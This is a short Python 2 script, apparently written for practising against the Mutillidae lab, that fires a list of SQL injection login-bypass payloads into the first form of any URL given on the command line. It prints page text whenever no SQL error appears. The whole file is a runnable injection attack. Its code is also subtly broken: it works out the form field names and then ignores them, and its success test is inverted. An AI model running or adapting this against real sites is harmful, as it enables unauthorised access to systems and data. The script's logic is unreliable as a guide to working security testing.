#!/usr/bin/env python
'''
This script is part of the scripts developed which test a Web Application against a number 
of vulnerabilities. It is a python implementation for the OWASP Top 10. 

This is focused on the A1: Injection
Threat Agents: Consider anyone who can send untrusted data to the system, including external 
users, internal users, and administrators.

The attacks take place to a local Multillidae platform which is installed in the Metasploitable2
Example Usage: ./a1.py http://192.168.1.10/mutillidae/index.php?page=user-info.php

created by: Dr Ciphers
'''

import mechanize 
import sys
from bs4 import BeautifulSoup

sqlInject =["' or ' 1 = 1", "' OR 1=1--", "admin' --", "') OR ('1'='1--" ]


def sqlinjector(url, sqlinjection):
        
        #credate a mechanize Browser
        browser = mechanize.Browser()
    
        #override the robots checking
        browser.set_handle_robots(False)
    
        browser.open(url)
        
        #select the first form
        browser.select_form(nr=0)
        print "[+] Testing SQL Injection :%s" %sqlinjection
        
        username='username'
        password='password'

        #fetch the actual form names for the username and password fields
        #overriding the above guess of the previous two lines
        for control in browser.form.controls:
            if ('user' in control.name) or ('login' in control.name) or ('uname' in control.name):
                username = control.name
            if ('pass' in control.name):
                password = control.name
        

        #prepare the username and password fields with data

        
        browser.form['password'] = sqlinjection
        
        response=browser.submit()
        htmlresult = response.read()
        
        return htmlresult


def validateSqli(html):
    if 'You have an error in your SQL syntax' in html:
        return "[!!] The Server is potentially Vulnerable to SQL Injection Attacks! Try another one"
    else:
        return 'Found'


def main():
    if len(sys.argv) !=2:
        print "Exiting... Usage: a1.py http://www.vulnerablesite.com"
        sys.exit(-1)

    url = sys.argv[1]


    #initiate the sql injection attacks
    for sqli in sqlInject:
        response = sqlinjector(url, sqli) 
        result = validateSqli(response) 
        
        if result !='Found':
            print result
        else:
            #use BeautifulSoup to print the data 
             bs = BeautifulSoup(response, 'lxml')
             data = bs.find("p").text
             print "BINGO!!! ***** %s\n" %data
              

if __name__=="__main__":
    main()
